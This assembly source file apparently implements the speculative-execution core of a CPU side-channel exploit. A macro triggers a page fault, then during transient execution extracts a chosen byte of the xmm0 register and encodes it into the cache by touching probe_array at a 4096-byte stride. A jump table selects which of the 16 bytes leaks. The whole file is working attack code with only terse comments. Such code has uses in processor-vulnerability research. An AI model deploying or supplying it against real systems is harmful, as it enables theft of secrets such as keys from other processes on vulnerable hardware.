.macro LEAK_REGISTER_A_BYTE_B XMM_REGISTER BYTE_IDX
  \BYTE_IDX:
    # Cause page fault
    movq $0, (0)
    # shift right xmm register
    psrldq $\BYTE_IDX, %xmm\XMM_REGISTER
    # mov xmm register to rax
    movq %xmm\XMM_REGISTER, %rax
    # get only first byte of rax
    and $0xff, %rax
    # align the byte to probe_array element size
    shl $12, %rax
    # use rax as index and access probe_array
    movzx probe_array(%rax), %rbx
    # trigger processor to stop speculate
    jmp stopspeculate
.endm

.extern probe_array

.global speculate
speculate:
    cmp $0, %rdi
    je 0f
    cmp $1, %rdi
    je 1f
    cmp $2, %rdi
    je 2f
    cmp $3, %rdi
    je 3f
    cmp $4, %rdi
    je 4f
    cmp $5, %rdi
    je 5f
    cmp $6, %rdi
    je 6f
    cmp $7, %rdi
    je 7f
    cmp $8, %rdi
    je 8f
    cmp $9, %rdi
    je 9f
    cmp $10, %rdi
    je 10f
    cmp $11, %rdi
    je 11f
    cmp $12, %rdi
    je 12f
    cmp $13, %rdi
    je 13f
    cmp $14, %rdi
    je 14f
    cmp $15, %rdi
    je 15f

LEAK_REGISTER_A_BYTE_B 0 0
LEAK_REGISTER_A_BYTE_B 0 1
LEAK_REGISTER_A_BYTE_B 0 2
LEAK_REGISTER_A_BYTE_B 0 3
LEAK_REGISTER_A_BYTE_B 0 4
LEAK_REGISTER_A_BYTE_B 0 5
LEAK_REGISTER_A_BYTE_B 0 6
LEAK_REGISTER_A_BYTE_B 0 7
LEAK_REGISTER_A_BYTE_B 0 8
LEAK_REGISTER_A_BYTE_B 0 9
LEAK_REGISTER_A_BYTE_B 0 10
LEAK_REGISTER_A_BYTE_B 0 11
LEAK_REGISTER_A_BYTE_B 0 12
LEAK_REGISTER_A_BYTE_B 0 13
LEAK_REGISTER_A_BYTE_B 0 14
LEAK_REGISTER_A_BYTE_B 0 15

.global stopspeculate
stopspeculate:
    nop
    ret
